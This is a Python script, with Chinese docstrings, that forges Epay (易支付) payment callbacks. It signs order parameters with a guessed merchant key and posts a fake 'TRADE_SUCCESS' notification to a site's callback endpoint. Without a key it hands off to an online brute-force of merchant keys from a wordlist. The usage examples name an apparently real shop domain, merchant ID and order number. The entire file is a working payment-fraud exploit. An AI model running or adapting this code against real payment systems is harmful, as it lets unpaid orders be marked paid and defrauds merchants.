#!/usr/bin/env python3
"""
易支付回调伪造测试（封装 epay_key_brute 在线模式 + 常见参数）。

示例:
  python3 notify_forge.py -u https://zhanghao9.com --pid 196 --money 5.46 \\
    --out-trade-no 903260704032647527 --key CANDIDATE_KEY
  python3 notify_forge.py -u https://zhanghao9.com --pid 196 --money 5.46 \\
    --out-trade-no 903260704032647527 -f /data/wordlists/epay/epay-keys-top.txt --limit 10000
"""
from __future__ import annotations

import argparse
import hashlib
import subprocess
import sys
from pathlib import Path

from faka_common import ensure_out, log

FAKA = Path("/data/tools/faka")


def md5_sign(params: dict, key: str) -> str:
    items = sorted((k, v) for k, v in params.items() if v)
    base = "&".join(f"{k}={v}" for k, v in items) + "&key=" + key
    return hashlib.md5(base.encode()).hexdigest()


def forge_once(base: str, pid: str, money: str, out_trade_no: str, key: str, notify_path: str) -> str:
    notify = base.rstrip("/") + notify_path
    params = {
        "money": money,
        "name": out_trade_no,
        "notify_url": notify,
        "out_trade_no": out_trade_no,
        "pid": pid,
        "return_url": base.rstrip("/") + f"/user/index/query?tradeNo={out_trade_no}",
        "sitename": out_trade_no,
        "type": "wxpay",
    }
    sign = md5_sign(params, key)
    import requests
    data = {**params, "trade_no": "forge", "trade_status": "TRADE_SUCCESS", "sign": sign, "sign_type": "MD5"}
    r = requests.post(notify, data=data, timeout=15, verify=False)
    return r.text[:300]


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="易支付 notify 伪造")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--pid", required=True)
    ap.add_argument("--money", required=True)
    ap.add_argument("--out-trade-no", required=True)
    ap.add_argument("--key", default="")
    ap.add_argument("-f", "--wordlist", default="")
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--notify-path", default="/user/api/order/callback.Epay")
    ap.add_argument("--workers", type=int, default=16)
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    if args.key:
        body = forge_once(args.url, args.pid, args.money, args.out_trade_no, args.key, args.notify_path)
        log(body)
        return

    if not args.wordlist:
        raise SystemExit("需要 --key 或 -f wordlist")

    cmd = [
        sys.executable, str(FAKA / "epay_key_brute.py"),
        "--online", "--callback", args.url.rstrip("/") + args.notify_path,
        "--wordlist", args.wordlist,
        "--pid", args.pid, "--money", args.money,
        "--out-trade-no", args.out_trade_no,
        "--notify-url", args.url.rstrip("/") + args.notify_path,
        "--return-url", args.url.rstrip("/") + f"/user/index/query?tradeNo={args.out_trade_no}",
        "--name", args.out_trade_no, "--sitename", args.out_trade_no,
        "--workers", str(args.workers),
    ]
    if args.limit:
        cmd += ["--limit", str(args.limit)]
    log(f"[*] delegate epay_key_brute --online")
    subprocess.run(cmd)


if __name__ == "__main__":
    main()
